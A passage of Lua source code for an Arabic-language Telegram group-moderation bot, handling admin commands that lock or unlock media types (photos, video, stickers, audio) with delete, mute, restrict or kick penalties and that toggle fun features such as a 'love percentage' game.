elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المعرفات بالكتم ')
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المعرفات بالطرد ')
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح المعرفات ')
end,nil)   
end

if text == 'تفعيل نسبه الحب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = ' ⋄تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل نسبه الحب'
else
Text = '\n⋄بالتاكيد تم تعطيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = ' ⋄تم تفعيل نسبه الرجوله'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل نسبه الرجوله'
else
Text = '\n⋄بالتاكيد تم تعطيل نسبه الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = ' ⋄تم تفعيل نسبه الكره'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل نسبه الكره'
else
Text = '\n⋄بالتاكيد تم تعطيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
Text = ' ⋄تم تفعيل نسبه الانوثه'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل نسبه الانوثه'
else
Text = '\n⋄بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر @all'
else
Text = '\n⋄بالتاكيد تم تعطيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل قول' and CoSu(msg) then   
if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر قول'
database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر قول'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل قول' and CoSu(msg) then  
if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر قول'
else
Text = '\n⋄بالتاكيد تم تعطيل امر قول'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'تفعيل غنيلي' and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر غنيلي'
else
Text = '\n⋄بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الاوامر' and CoSu(msg) then   
if database:get(bot_id..'coomand'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر الاوامر'
database:del(bot_id..'coomand'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر الاوامر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاوامر' and CoSu(msg) then  
if not database:get(bot_id..'coomand'..msg.chat_id_) then
database:set(bot_id..'coomand'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر الاوامر'
else
Text = '\n⋄بالتاكيد تم تعطيل امر الاوامر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التاك ')
end,nil)   
elseif text == 'قفل التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التاك بالطرد ')
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح التاك ')
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الشارحه ')
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الشارحه بالتقييد ')
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الشارحه بالكتم ')
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الشارحه بالطرد ')
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الشارحه ')
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصور ')
end,nil)   
elseif text == 'قفل الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصور بالتقييد ')
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصور بالكتم ')
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصور بالطرد ')
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الصور ')
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الفيديو ')
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الفيديو بالتقييد ')
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الفيديو بالكتم ')
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الفيديو بالطرد ')
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الفيديو ')
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المتحركه ')
end,nil)   
elseif text == 'قفل المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المتحركه بالتقييد ')
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المتحركه بالكتم ')
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المتحركه بالطرد ')
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح المتحركه ')
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الالعاب ')
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الالعاب بالتقييد ')
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الالعاب بالكتم ')
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الالعاب بالطرد ')
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الالعاب ')
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاغاني ')
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاغاني بالتقييد ')
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاغاني بالكتم ')
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاغاني بالطرد ')
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الاغاني ')
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصوت ')
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصوت بالتقييد ')
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصوت بالكتم ')
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الصوت بالطرد ')
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الصوت ')
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكيبورد ')
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكيبورد بالتقييد ')
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكيبورد بالكتم ')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكيبورد بالطرد ')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الكيبورد ')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملصقات ')  
end,nil)   
